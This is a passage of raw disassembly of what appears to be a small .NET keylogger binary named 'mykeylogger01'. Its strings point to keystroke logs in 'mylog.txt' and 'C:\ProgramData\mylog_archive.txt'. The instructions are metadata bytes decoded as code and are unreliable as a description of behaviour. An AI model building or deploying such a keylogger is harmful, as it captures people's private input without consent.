  403655:	00 5c 00 6d          	add    %bl,0x6d(%eax,%eax,1)
  403659:	00 79 00             	add    %bh,0x0(%ecx)
  40365c:	6c                   	insb   (%dx),%es:(%edi)
  40365d:	00 6f 00             	add    %ch,0x0(%edi)
  403660:	67 00 2e 00 74       	add    %ch,0x7400
  403665:	00 78 00             	add    %bh,0x0(%eax)
  403668:	74 00                	je     0x40366a
  40366a:	40                   	inc    %eax
  40366b:	43                   	inc    %ebx
  40366c:	00 3a                	add    %bh,(%edx)
  40366e:	00 5c 00 50          	add    %bl,0x50(%eax,%eax,1)
  403672:	00 72 00             	add    %dh,0x0(%edx)
  403675:	6f                   	outsl  %ds:(%esi),(%dx)
  403676:	00 67 00             	add    %ah,0x0(%edi)
  403679:	72 00                	jb     0x40367b
  40367b:	61                   	popa
  40367c:	00 6d 00             	add    %ch,0x0(%ebp)
  40367f:	44                   	inc    %esp
  403680:	00 61 00             	add    %ah,0x0(%ecx)
  403683:	74 00                	je     0x403685
  403685:	61                   	popa
  403686:	00 5c 00 6d          	add    %bl,0x6d(%eax,%eax,1)
  40368a:	00 79 00             	add    %bh,0x0(%ecx)
  40368d:	6c                   	insb   (%dx),%es:(%edi)
  40368e:	00 6f 00             	add    %ch,0x0(%edi)
  403691:	67 00 5f 00          	add    %bl,0x0(%bx)
  403695:	61                   	popa
  403696:	00 72 00             	add    %dh,0x0(%edx)
  403699:	63 00                	arpl   %eax,(%eax)
  40369b:	68 00 69 00 76       	push   $0x76006900
  4036a0:	00 65 00             	add    %ah,0x0(%ebp)
  4036a3:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  4036a8:	00 74 00 01          	add    %dh,0x1(%eax,%eax,1)
  4036ac:	01 04 d0             	add    %eax,(%eax,%edx,8)
  4036af:	07                   	pop    %es
  4036b0:	00 00                	add    %al,(%eax)
  4036b2:	04 00                	add    $0x0,%al
  4036b4:	00 00                	add    %al,(%eax)
  4036b6:	00 02                	add    %al,(%edx)
  4036b8:	06                   	push   %es
  4036b9:	0e                   	push   %cs
  4036ba:	02 06                	add    (%esi),%al
  4036bc:	02 02                	add    (%edx),%al
  4036be:	06                   	push   %es
  4036bf:	08 03                	or     %al,(%ebx)
  4036c1:	06                   	push   %es
  4036c2:	12 0c 05 00 01 01 1d 	adc    0x1d010100(,%eax,1),%cl
  4036c9:	0e                   	push   %cs
  4036ca:	06                   	push   %es
  4036cb:	00 03                	add    %al,(%ebx)
  4036cd:	18 08                	sbb    %cl,(%eax)
  4036cf:	18 18                	sbb    %bl,(%eax)
  4036d1:	05 00 01 18 12       	add    $0x12180100,%eax
  4036d6:	0c 07                	or     $0x7,%al
  4036d8:	00 04 18             	add    %al,(%eax,%ebx,1)
  4036db:	18 08                	sbb    %cl,(%eax)
  4036dd:	18 18                	sbb    %bl,(%eax)
  4036df:	08 00                	or     %al,(%eax)
  4036e1:	04 18                	add    $0x18,%al
  4036e3:	08 12                	or     %dl,(%edx)
  4036e5:	0c 18                	or     $0x18,%al
  4036e7:	09 04 00             	or     %eax,(%eax,%eax,1)
  4036ea:	01 02                	add    %eax,(%edx)
  4036ec:	18 04 00             	sbb    %al,(%eax,%eax,1)
  4036ef:	01 18                	add    %ebx,(%eax)
  4036f1:	0e                   	push   %cs
  4036f2:	06                   	push   %es
  4036f3:	20 03                	and    %al,(%ebx)
  4036f5:	18 08                	sbb    %cl,(%eax)
  4036f7:	18 18                	sbb    %bl,(%eax)
  4036f9:	0a 20                	or     (%eax),%ah
  4036fb:	05 12 79 08 18       	add    $0x18087912,%eax
  403700:	18 12                	sbb    %dl,(%edx)
  403702:	7d 1c                	jge    0x403720
  403704:	05 20 01 18 12       	add    $0x12180120,%eax
  403709:	79 08                	jns    0x403713
  40370b:	01 00                	add    %eax,(%eax)
  40370d:	08 00                	or     %al,(%eax)
  40370f:	00 00                	add    %al,(%eax)
  403711:	00 00                	add    %al,(%eax)
  403713:	1e                   	push   %ds
  403714:	01 00                	add    %eax,(%eax)
  403716:	01 00                	add    %eax,(%eax)
  403718:	54                   	push   %esp
  403719:	02 16                	add    (%esi),%dl
  40371b:	57                   	push   %edi
  40371c:	72 61                	jb     0x40377f
  40371e:	70 4e                	jo     0x40376e
  403720:	6f                   	outsl  %ds:(%esi),(%dx)
  403721:	6e                   	outsb  %ds:(%esi),(%dx)
  403722:	45                   	inc    %ebp
  403723:	78 63                	js     0x403788
  403725:	65 70 74             	gs jo  0x40379c
  403728:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40372f:	77 73                	ja     0x4037a4
  403731:	01 08                	add    %ecx,(%eax)
  403733:	01 00                	add    %eax,(%eax)
  403735:	07                   	pop    %es
  403736:	01 00                	add    %eax,(%eax)
  403738:	00 00                	add    %al,(%eax)
  40373a:	00 12                	add    %dl,(%edx)
  40373c:	01 00                	add    %eax,(%eax)
  40373e:	0d 6d 79 6b 65       	or     $0x656b796d,%eax
  403743:	79 6c                	jns    0x4037b1
  403745:	6f                   	outsl  %ds:(%esi),(%dx)
  403746:	67 67 65 72 30       	addr16 addr16 gs jb 0x40377b
  40374b:	31 00                	xor    %eax,(%eax)
  40374d:	00 05 01 00 00 00    	add    %al,0x1
  403753:	00 17                	add    %dl,(%edi)
  403755:	01 00                	add    %eax,(%eax)
  403757:	12 43 6f             	adc    0x6f(%ebx),%al
  40375a:	70 79                	jo     0x4037d5
  40375c:	72 69                	jb     0x4037c7
  40375e:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  403764:	20 20                	and    %ah,(%eax)
  403766:	32 30                	xor    (%eax),%dh
  403768:	31 37                	xor    %esi,(%edi)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	29 01                	sub    %eax,(%ecx)
  40376e:	00 24 38             	add    %ah,(%eax,%edi,1)
  403771:	65 38 37             	cmp    %dh,%gs:(%edi)
  403774:	38 66 35             	cmp    %ah,0x35(%esi)
  403777:	33 2d 66 61 36 36    	xor    0x36366166,%ebp
  40377d:	2d 34 62 63 35       	sub    $0x35636234,%eax
  403782:	2d 61 38 36 62       	sub    $0x62363861,%eax
  403787:	2d 62 32 65 38       	sub    $0x38653262,%eax
  40378c:	65 31 35 32 38 31 62 	xor    %esi,%gs:0x62313832
  403793:	34 00                	xor    $0x0,%al
  403795:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  403798:	00 07                	add    %al,(%edi)
  40379a:	31 2e                	xor    %ebp,(%esi)
  40379c:	30 2e                	xor    %ch,(%esi)
  40379e:	30 2e                	xor    %ch,(%esi)
  4037a0:	30 00                	xor    %al,(%eax)
  4037a2:	00 47 01             	add    %al,0x1(%edi)
  4037a5:	00 1a                	add    %bl,(%edx)
  4037a7:	2e 4e                	cs dec %esi
  4037a9:	45                   	inc    %ebp
  4037aa:	54                   	push   %esp
  4037ab:	46                   	inc    %esi
  4037ac:	72 61                	jb     0x40380f
  4037ae:	6d                   	insl   (%dx),%es:(%edi)
  4037af:	65 77 6f             	gs ja  0x403821
  4037b2:	72 6b                	jb     0x40381f
  4037b4:	2c 56                	sub    $0x56,%al
  4037b6:	65 72 73             	gs jb  0x40382c
  4037b9:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  4037c0:	30 01                	xor    %al,(%ecx)
  4037c2:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  4037c6:	46                   	inc    %esi
  4037c7:	72 61                	jb     0x40382a
  4037c9:	6d                   	insl   (%dx),%es:(%edi)
  4037ca:	65 77 6f             	gs ja  0x40383c
  4037cd:	72 6b                	jb     0x40383a
  4037cf:	44                   	inc    %esp
  4037d0:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  4037d7:	61                   	popa
  4037d8:	6d                   	insl   (%dx),%es:(%edi)
  4037d9:	65 10 2e             	adc    %ch,%gs:(%esi)
  4037dc:	4e                   	dec    %esi
  4037dd:	45                   	inc    %ebp
  4037de:	54                   	push   %esp
  4037df:	20 46 72             	and    %al,0x72(%esi)
  4037e2:	61                   	popa
  4037e3:	6d                   	insl   (%dx),%es:(%edi)
  4037e4:	65 77 6f             	gs ja  0x403856
  4037e7:	72 6b                	jb     0x403854
  4037e9:	20 34 00             	and    %dh,(%eax,%eax,1)
  4037ec:	00 00                	add    %al,(%eax)
  4037ee:	00 00                	add    %al,(%eax)
  4037f0:	ed                   	in     (%dx),%eax
  4037f1:	1a 23                	sbb    (%ebx),%ah
  4037f3:	60                   	pusha
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	02 00                	add    (%eax),%al
  4037fa:	00 00                	add    %al,(%eax)
  4037fc:	1c 01                	sbb    $0x1,%al
  4037fe:	00 00                	add    %al,(%eax)
  403800:	08 38                	or     %bh,(%eax)
  403802:	00 00                	add    %al,(%eax)
  403804:	08 1a                	or     %bl,(%edx)
  403806:	00 00                	add    %al,(%eax)
  403808:	52                   	push   %edx
  403809:	53                   	push   %ebx
  40380a:	44                   	inc    %esp
  40380b:	53                   	push   %ebx
  40380c:	98                   	cwtl
  40380d:	b0 73                	mov    $0x73,%al
  40380f:	ed                   	in     (%dx),%eax
  403810:	64 fc                	fs cld
  403812:	a8 45                	test   $0x45,%al
  403814:	8e 8e dc 7d 9d af    	mov    -0x50628224(%esi),%cs
  40381a:	ff 83 01 00 00 00    	incl   0x1(%ebx)
  403820:	43                   	inc    %ebx
  403821:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  403825:	65 72 73             	gs jb  0x40389b
  403828:	5c                   	pop    %esp
  403829:	6b 79 6c 65          	imul   $0x65,0x6c(%ecx),%edi
  40382d:	62 5c 73 6f          	bound  %ebx,0x6f(%ebx,%esi,2)
  403831:	75 72                	jne    0x4038a5
  403833:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  403836:	72 65                	jb     0x40389d
  403838:	70 6f                	jo     0x4038a9
  40383a:	73 5c                	jae    0x403898
  40383c:	4b                   	dec    %ebx
  40383d:	65 79 20             	gs jns 0x403860
  403840:	4c                   	dec    %esp
  403841:	6f                   	outsl  %ds:(%esi),(%dx)
  403842:	67 67 65 72 5c       	addr16 addr16 gs jb 0x4038a3
  403847:	6d                   	insl   (%dx),%es:(%edi)
  403848:	79 6b                	jns    0x4038b5
  40384a:	65 79 6c             	gs jns 0x4038b9
  40384d:	6f                   	outsl  %ds:(%esi),(%dx)
  40384e:	67 67 65 72 30       	addr16 addr16 gs jb 0x403883
  403853:	31 5c 6f 62          	xor    %ebx,0x62(%edi,%ebp,2)
  403857:	6a 5c                	push   $0x5c
  403859:	44                   	inc    %esp
  40385a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40385e:	5c                   	pop    %esp
  40385f:	6d                   	insl   (%dx),%es:(%edi)
  403860:	79 6b                	jns    0x4038cd
  403862:	65 79 6c             	gs jns 0x4038d1
  403865:	6f                   	outsl  %ds:(%esi),(%dx)
  403866:	67 67 65 72 30       	addr16 addr16 gs jb 0x40389b
  40386b:	31 2e                	xor    %ebp,(%esi)
  40386d:	70 64                	jo     0x4038d3
  40386f:	62 00                	bound  %eax,(%eax)
	...
  403921:	00 00                	add    %al,(%eax)
  403923:	00 4c 39 00          	add    %cl,0x0(%ecx,%edi,1)
	...
  40392f:	00 66 39             	add    %ah,0x39(%esi)
  403932:	00 00                	add    %al,(%eax)
  403934:	00 20                	add    %ah,(%eax)
	...
  40394a:	00 00                	add    %al,(%eax)
  40394c:	58                   	pop    %eax
  40394d:	39 00                	cmp    %eax,(%eax)
	...
  403957:	00 00                	add    %al,(%eax)
  403959:	00 5f 43             	add    %bl,0x43(%edi)
  40395c:	6f                   	outsl  %ds:(%esi),(%dx)
  40395d:	72 45                	jb     0x4039a4
  40395f:	78 65                	js     0x4039c6
  403961:	4d                   	dec    %ebp
  403962:	61                   	popa
  403963:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40396a:	72 65                	jb     0x4039d1
  40396c:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403970:	6c                   	insb   (%dx),%es:(%edi)
  403971:	00 00                	add    %al,(%eax)
  403973:	00 00                	add    %al,(%eax)
  403975:	00 ff                	add    %bh,%bh
  403977:	25 00 20 40 00       	and    $0x402000,%eax
